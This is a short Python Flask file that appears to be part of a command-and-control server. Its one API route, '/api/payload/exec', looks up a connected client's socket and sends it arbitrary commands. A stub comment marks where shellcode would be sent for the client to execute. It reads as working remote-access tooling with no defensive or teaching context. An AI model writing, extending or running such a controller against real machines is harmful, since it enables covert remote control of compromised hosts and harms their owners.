import flask
import threading
import common
import json


api_routes = flask.Blueprint('api', __name__)


@api_routes.route('/api/payload/exec', methods=['POST'])
def exec_payload():
	data = json.loads(flask.request.data.decode())
	client = data["client"]
	payload = data["payload"]

	if client and payload:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:

			if payload.startswith("exec:"):
				pass  # send shellcode and get client to exec
			else:
				client_sock.send(payload.encode())  # send command

			return "Sent", 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400
